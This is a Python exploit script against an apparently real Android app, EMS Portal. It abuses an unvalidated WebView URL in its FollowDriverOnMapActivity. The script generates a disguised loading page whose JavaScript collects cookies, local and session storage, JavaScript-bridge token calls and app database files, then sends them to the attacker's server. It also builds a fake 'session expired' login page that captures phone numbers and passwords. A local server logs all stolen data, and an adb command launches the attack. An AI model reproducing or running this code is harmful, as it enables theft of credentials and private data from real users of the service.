#!/usr/bin/env python3
"""
EMS Portal WebView XSS Exploit
æ— éœ€Token - å®Œå…¨æ§åˆ¶åº”ç”¨
"""

import subprocess
import sys
import http.server
import socketserver
import threading
import time
import json
from datetime import datetime

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class WebViewExploit:
    def __init__(self):
        self.collected_data = []
    
    def print_banner(self):
        print(f"""
{Colors.RED}{Colors.BOLD}
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘   EMS Portal - WebView XSS Exploit (æ— éœ€Token!)         â•‘
â•‘   æ¼æ´: FollowDriverOnMapActivity                        â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
{Colors.RESET}

{Colors.YELLOW}æ¼æ´ä»£ç :{Colors.RESET}
  String url = getIntent().getStringExtra("KEY_URL_FOLLOW_DRIVER_ON_MAP");
  webView.loadUrl(url);  {Colors.RED}// æ— éªŒè¯!{Colors.RESET}
  webView.getSettings().setJavaScriptEnabled(true);  {Colors.RED}// JSå¯ç”¨!{Colors.RESET}

{Colors.GREEN}æ”»å‡»å‘é‡:{Colors.RESET}
  âœ… æ— éœ€Token
  âœ… å¯å¤–éƒ¨è§¦å‘
  âœ… JavaScriptæ‰§è¡Œ
  âœ… çªƒå–æœ¬åœ°æ•°æ®

{Colors.CYAN}CVSS: 9.3 (CRITICAL){Colors.RESET}
        """)
    
    def generate_payload(self, server_ip, server_port=8000):
        """ç”Ÿæˆæ¶æ„HTMLé¡µé¢"""
        
        payload = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>EMS Portal - Äang táº£i...</title>
    <style>
        body {{ 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: white;
        }}
        
        .container {{
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }}
        
        h1 {{ 
            margin: 0 0 20px 0;
            font-size: 24px;
            font-weight: 600;
        }}
        
        .loading {{ 
            display: inline-block;
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px 0;
        }}
        
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        
        .status {{
            font-size: 14px;
            opacity: 0.8;
            margin-top: 15px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸšš Äang táº£i thÃ´ng tin giao hÃ ng...</h1>
        <div class="loading"></div>
        <div class="status" id="status">Äang káº¿t ná»‘i...</div>
    </div>
    
    <script>
    (function() {{
        var statusEl = document.getElementById('status');
        
        function updateStatus(msg) {{
            statusEl.textContent = msg;
            console.log('[*] ' + msg);
        }}
        
        updateStatus('Äang thu tháº­p dá»¯ liá»‡u...');
        
        // æ”¶é›†æ‰€æœ‰å¯èƒ½çš„æ•æ„Ÿæ•°æ®
        var data = {{
            exploit: 'EMS_WebView_XSS',
            timestamp: new Date().toISOString(),
            device: {{
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: {{
                    width: screen.width,
                    height: screen.height
                }}
            }},
            location: {{
                href: window.location.href,
                origin: window.location.origin,
                protocol: window.location.protocol
            }},
            cookies: document.cookie,
            localStorage: {{}},
            sessionStorage: {{}},
            androidBridges: {{}}
        }};
        
        // LocalStorage
        try {{
            for (var i = 0; i < localStorage.length; i++) {{
                var key = localStorage.key(i);
                data.localStorage[key] = localStorage.getItem(key);
            }}
            updateStatus('âœ“ LocalStorage Ä‘Ã£ thu tháº­p');
        }} catch(e) {{
            data.localStorage_error = e.toString();
        }}
        
        // SessionStorage
        try {{
            for (var i = 0; i < sessionStorage.length; i++) {{
                var key = sessionStorage.key(i);
                data.sessionStorage[key] = sessionStorage.getItem(key);
            }}
            updateStatus('âœ“ SessionStorage Ä‘Ã£ thu tháº­p');
        }} catch(e) {{
            data.sessionStorage_error = e.toString();
        }}
        
        // æ£€æµ‹Android JavaScript Bridge
        var bridges = [
            'Android', 'JSInterface', 'WebAppInterface', 
            'Bridge', 'EMSPortal', 'EMSBridge',
            'AppInterface', 'NativeInterface'
        ];
        
        bridges.forEach(function(bridgeName) {{
            if (window[bridgeName]) {{
                try {{
                    data.androidBridges[bridgeName] = {{
                        exists: true,
                        methods: Object.keys(window[bridgeName])
                    }};
                    
                    // å°è¯•è°ƒç”¨å¸¸è§æ–¹æ³•
                    var commonMethods = ['getToken', 'getUserInfo', 'getData'];
                    data.androidBridges[bridgeName].results = {{}};
                    
                    commonMethods.forEach(function(method) {{
                        if (typeof window[bridgeName][method] === 'function') {{
                            try {{
                                var result = window[bridgeName][method]();
                                data.androidBridges[bridgeName].results[method] = result;
                            }} catch(e) {{
                                data.androidBridges[bridgeName].results[method] = 'Error: ' + e;
                            }}
                        }}
                    }});
                }} catch(e) {{
                    data.androidBridges[bridgeName] = {{ error: e.toString() }};
                }}
            }}
        }});
        
        updateStatus('Äang gá»­i dá»¯ liá»‡u...');
        
        // å‘é€æ•°æ®åˆ°æ”»å‡»è€…æœåŠ¡å™¨
        fetch('http://{server_ip}:{server_port}/collect', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify(data),
            mode: 'no-cors'
        }}).then(function() {{
            updateStatus('âœ“ ÄÃ£ hoÃ n thÃ nh');
            console.log('[+] Data sent successfully');
            
            // å°è¯•è¯»å–æœ¬åœ°æ–‡ä»¶
            updateStatus('Äang kiá»ƒm tra quyá»n truy cáº­p file...');
            
            var files = [
                'file:///data/data/com.emsportal/shared_prefs/prefs.xml',
                'file:///data/data/com.emsportal/databases/db.sqlite',
                'file:///sdcard/ems_data.json',
                'file:///sdcard/Download/ems_export.csv'
            ];
            
            files.forEach(function(filepath) {{
                fetch(filepath)
                    .then(r => r.text())
                    .then(content => {{
                        fetch('http://{server_ip}:{server_port}/file', {{
                            method: 'POST',
                            headers: {{'Content-Type': 'application/json'}},
                            body: JSON.stringify({{
                                file: filepath,
                                content: content,
                                timestamp: new Date().toISOString()
                            }}),
                            mode: 'no-cors'
                        }});
                        console.log('[+] File read: ' + filepath);
                    }})
                    .catch(e => {{
                        console.log('[-] Cannot read: ' + filepath);
                    }});
            }});
            
        }}).catch(function(error) {{
            updateStatus('âš  Lá»—i káº¿t ná»‘i');
            console.log('[!] Error: ' + error);
        }});
        
        // 3ç§’åé‡å®šå‘
        setTimeout(function() {{
            updateStatus('Äang chuyá»ƒn hÆ°á»›ng...');
            // å¯ä»¥é‡å®šå‘åˆ°é’“é±¼é¡µé¢æˆ–çœŸå®é¡µé¢
            window.location = 'https://ems.com.vn';
        }}, 3000);
        
    }})();
    </script>
</body>
</html>"""
        
        return payload
    
    def generate_phishing_page(self):
        """ç”Ÿæˆé’“é±¼é¡µé¢"""
        
        phishing = """<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>EMS Portal - ÄÄƒng nháº­p</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: #f5f5f5;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            background: white;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        h1 {
            font-size: 24px;
            color: #333;
            text-align: center;
            margin-bottom: 10px;
        }
        .notice {
            background: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        input:focus {
            outline: none;
            border-color: #4CAF50;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        button:active {
            background: #45a049;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #999;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>ğŸšš EMS Portal</h1>
        </div>
        
        <div class="notice">
            âš ï¸ PhiÃªn Ä‘Äƒng nháº­p cá»§a báº¡n Ä‘Ã£ háº¿t háº¡n. Vui lÃ²ng Ä‘Äƒng nháº­p láº¡i.
        </div>
        
        <form id="loginForm">
            <input type="tel" id="phone" placeholder="Sá»‘ Ä‘iá»‡n thoáº¡i" required>
            <input type="password" id="password" placeholder="Máº­t kháº©u" required>
            <button type="submit">ÄÄƒng nháº­p</button>
        </form>
        
        <div class="footer">
            EMS Vietnam Â© 2025
        </div>
    </div>
    
    <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        var phone = document.getElementById('phone').value;
        var password = document.getElementById('password').value;
        
        // å‘é€å‡­è¯åˆ°æ”»å‡»è€…
        fetch('http://ATTACKER_IP:8000/phish', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                phone: phone,
                password: password,
                timestamp: new Date().toISOString()
            }),
            mode: 'no-cors'
        });
        
        // æ˜¾ç¤ºåŠ è½½çŠ¶æ€
        alert('Äang xá»­ lÃ½...');
        
        // é‡å®šå‘åˆ°çœŸå®ç™»å½•é¡µ
        setTimeout(function() {
            window.location = 'https://ems.com.vn/login';
        }, 1000);
    });
    </script>
</body>
</html>"""
        
        return phishing
    
    def start_server(self, port=8000):
        """å¯åŠ¨HTTPæœåŠ¡å™¨"""
        
        exploit_instance = self
        
        class CustomHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/payload.html':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(open('payload.html', 'rb').read())
                elif self.path == '/phishing.html':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(open('phishing.html', 'rb').read())
                else:
                    super().do_GET()
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length)
                
                if self.path == '/collect':
                    print(f"\n{Colors.GREEN}{'='*60}{Colors.RESET}")
                    print(f"{Colors.GREEN}{Colors.BOLD}[+] æ”¶åˆ°æ•°æ®!{Colors.RESET}")
                    print(f"{Colors.GREEN}{'='*60}{Colors.RESET}\n")
                    
                    try:
                        data = json.loads(post_data.decode())
                        print(f"{Colors.CYAN}æ—¶é—´æˆ³:{Colors.RESET} {data.get('timestamp')}")
                        print(f"{Colors.CYAN}è®¾å¤‡:{Colors.RESET} {data.get('device', {}).get('userAgent')}")
                        
                        # LocalStorage
                        if data.get('localStorage'):
                            print(f"\n{Colors.YELLOW}LocalStorage:{Colors.RESET}")
                            for key, value in data['localStorage'].items():
                                print(f"  {key}: {value[:100] if len(str(value)) > 100 else value}")
                        
                        # Android Bridges
                        if data.get('androidBridges'):
                            print(f"\n{Colors.RED}Android Bridges:{Colors.RESET}")
                            for bridge, info in data['androidBridges'].items():
                                print(f"  {bridge}: {info}")
                        
                        # ä¿å­˜å®Œæ•´æ•°æ®
                        with open('collected_data.json', 'a') as f:
                            f.write(json.dumps(data, indent=2) + '\n\n')
                        
                        print(f"\n{Colors.GREEN}[âœ“] æ•°æ®å·²ä¿å­˜åˆ° collected_data.json{Colors.RESET}\n")
                    
                    except Exception as e:
                        print(f"{Colors.RED}è§£æé”™è¯¯: {e}{Colors.RESET}")
                        print(post_data.decode())
                
                elif self.path == '/file':
                    print(f"\n{Colors.RED}{'='*60}{Colors.RESET}")
                    print(f"{Colors.RED}{Colors.BOLD}[!] æ”¶åˆ°æ–‡ä»¶æ•°æ®!{Colors.RESET}")
                    print(f"{Colors.RED}{'='*60}{Colors.RESET}\n")
                    
                    try:
                        data = json.loads(post_data.decode())
                        filepath = data.get('file', 'unknown')
                        content = data.get('content', '')
                        
                        print(f"{Colors.CYAN}æ–‡ä»¶:{Colors.RESET} {filepath}")
                        print(f"{Colors.CYAN}å†…å®¹:{Colors.RESET} {content[:500]}...")
                        
                        with open('collected_files.txt', 'a') as f:
                            f.write(f"\n{'='*60}\n")
                            f.write(f"File: {filepath}\n")
                            f.write(f"Time: {data.get('timestamp')}\n")
                            f.write(f"{'='*60}\n")
                            f.write(content + '\n\n')
                        
                        print(f"\n{Colors.GREEN}[âœ“] æ–‡ä»¶å·²ä¿å­˜åˆ° collected_files.txt{Colors.RESET}\n")
                    
                    except Exception as e:
                        print(f"{Colors.RED}è§£æé”™è¯¯: {e}{Colors.RESET}")
                
                elif self.path == '/phish':
                    print(f"\n{Colors.RED}{'='*60}{Colors.RESET}")
                    print(f"{Colors.RED}{Colors.BOLD}[!!!] é’“é±¼æˆåŠŸ - è·å–å‡­è¯!{Colors.RESET}")
                    print(f"{Colors.RED}{'='*60}{Colors.RESET}\n")
                    
                    try:
                        data = json.loads(post_data.decode())
                        print(f"{Colors.YELLOW}æ‰‹æœº:{Colors.RESET} {data.get('phone')}")
                        print(f"{Colors.YELLOW}å¯†ç :{Colors.RESET} {data.get('password')}")
                        print(f"{Colors.YELLOW}æ—¶é—´:{Colors.RESET} {data.get('timestamp')}")
                        
                        with open('phished_credentials.txt', 'a') as f:
                            f.write(json.dumps(data, indent=2) + '\n\n')
                        
                        print(f"\n{Colors.GREEN}[âœ“] å‡­è¯å·²ä¿å­˜åˆ° phished_credentials.txt{Colors.RESET}\n")
                    
                    except Exception as e:
                        print(f"{Colors.RED}è§£æé”™è¯¯: {e}{Colors.RESET}")
                
                self.send_response(200)
                self.end_headers()
            
            def log_message(self, format, *args):
                pass
        
        try:
            with socketserver.TCPServer(("", port), CustomHandler) as httpd:
                print(f"{Colors.GREEN}[*] HTTPæœåŠ¡å™¨å·²å¯åŠ¨: http://0.0.0.0:{port}{Colors.RESET}")
                print(f"{Colors.YELLOW}[*] ç­‰å¾…è¿æ¥...{Colors.RESET}\n")
                httpd.serve_forever()
        except OSError as e:
            print(f"{Colors.RED}[!] ç«¯å£ {port} å·²è¢«å ç”¨ï¼Œå°è¯•ä½¿ç”¨ {port+1}{Colors.RESET}")
            self.start_server(port + 1)
    
    def trigger_exploit(self, server_url):
        """è§¦å‘WebViewæ¼æ´"""
        print(f"\n{Colors.CYAN}[*] è§¦å‘WebView XSS...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] ç›®æ ‡URL: {server_url}{Colors.RESET}")
        
        cmd = [
            'adb', 'shell', 'am', 'start',
            '-n', 'com.emsportal/.grab.activity.FollowDriverOnMapActivity',
            '-e', 'KEY_URL_FOLLOW_DRIVER_ON_MAP', server_url
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                print(f"{Colors.GREEN}[+] Activityå·²å¯åŠ¨!{Colors.RESET}")
                print(f"{Colors.YELLOW}[*] WebViewæ­£åœ¨åŠ è½½æ¶æ„é¡µé¢...{Colors.RESET}")
                return True
            else:
                print(f"{Colors.RED}[!] å¯åŠ¨å¤±è´¥:{Colors.RESET}")
                print(f"{Colors.RED}{result.stderr}{Colors.RESET}")
                return False
        
        except subprocess.TimeoutExpired:
            print(f"{Colors.YELLOW}[!] å‘½ä»¤è¶…æ—¶ï¼Œä½†å¯èƒ½å·²å¯åŠ¨{Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.RED}[!] é”™è¯¯: {e}{Colors.RESET}")
            return False
    
    def exploit(self, server_ip, server_port=8000, phishing=False):
        """å®Œæ•´åˆ©ç”¨æµç¨‹"""
        self.print_banner()
        
        # 1. ç”Ÿæˆpayload
        print(f"{Colors.CYAN}[1] ç”ŸæˆXSS Payload...{Colors.RESET}")
        payload = self.generate_payload(server_ip, server_port)
        
        with open('payload.html', 'w', encoding='utf-8') as f:
            f.write(payload)
        
        print(f"{Colors.GREEN}[âœ“] XSS Payloadå·²ä¿å­˜: payload.html{Colors.RESET}")
        
        if phishing:
            phishing_page = self.generate_phishing_page()
            with open('phishing.html', 'w', encoding='utf-8') as f:
                f.write(phishing_page.replace('ATTACKER_IP', server_ip))
            print(f"{Colors.GREEN}[âœ“] é’“é±¼é¡µé¢å·²ä¿å­˜: phishing.html{Colors.RESET}")
        
        # 2. å¯åŠ¨HTTPæœåŠ¡å™¨
        print(f"\n{Colors.CYAN}[2] å¯åŠ¨HTTPæœåŠ¡å™¨...{Colors.RESET}")
        server_thread = threading.Thread(target=self.start_server, args=(server_port,))
        server_thread.daemon = True
        server_thread.start()
        
        time.sleep(2)
        
        # 3. è§¦å‘æ¼æ´
        print(f"\n{Colors.CYAN}[3] è§¦å‘WebViewæ¼æ´...{Colors.RESET}")
        server_url = f"http://{server_ip}:{server_port}/payload.html"
        
        success = self.trigger_exploit(server_url)
        
        if success:
            print(f"\n{Colors.GREEN}{'='*60}{Colors.RESET}")
            print(f"{Colors.GREEN}{Colors.BOLD}[âœ“] åˆ©ç”¨æˆåŠŸ! ç­‰å¾…æ•°æ®å›ä¼ ...{Colors.RESET}")
            print(f"{Colors.GREEN}{'='*60}{Colors.RESET}\n")
            print(f"{Colors.YELLOW}æ•°æ®å°†å®æ—¶æ˜¾ç¤ºå¹¶ä¿å­˜åˆ°:{Colors.RESET}")
            print(f"  â€¢ collected_data.json - çªƒå–çš„æ•°æ®")
            print(f"  â€¢ collected_files.txt - æœ¬åœ°æ–‡ä»¶")
            print(f"  â€¢ phished_credentials.txt - é’“é±¼å‡­è¯")
            print(f"\n{Colors.YELLOW}[*] æŒ‰Ctrl+Cåœæ­¢{Colors.RESET}\n")
            
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n{Colors.GREEN}[âœ“] å·²åœæ­¢{Colors.RESET}")
        else:
            print(f"\n{Colors.RED}[!] åˆ©ç”¨å¤±è´¥ - è¯·æ£€æŸ¥:{Colors.RESET}")
            print(f"  1. æ‰‹æœºæ˜¯å¦é€šè¿‡USBè¿æ¥")
            print(f"  2. adb devices æ˜¯å¦æ˜¾ç¤ºè®¾å¤‡")
            print(f"  3. EMS Appæ˜¯å¦å·²å®‰è£…")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description='EMS Portal WebView XSS Exploit (æ— éœ€Token)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
ç¤ºä¾‹:
  # åŸºç¡€åˆ©ç”¨
  python3 webview_exploit.py --ip 192.168.1.100
  
  # æŒ‡å®šç«¯å£
  python3 webview_exploit.py --ip 192.168.1.100 --port 8080
  
  # åŒ…å«é’“é±¼é¡µé¢
  python3 webview_exploit.py --ip 192.168.1.100 --phishing
        '''
    )
    
    parser.add_argument('--ip', required=True, help='ä½ çš„IPåœ°å€')
    parser.add_argument('--port', type=int, default=8000, help='HTTPæœåŠ¡å™¨ç«¯å£ (é»˜è®¤: 8000)')
    parser.add_argument('--phishing', action='store_true', help='ç”Ÿæˆé’“é±¼é¡µé¢')
    
    args = parser.parse_args()
    
    exploit = WebViewExploit()
    exploit.exploit(args.ip, args.port, args.phishing)

if __name__ == '__main__':
    main()
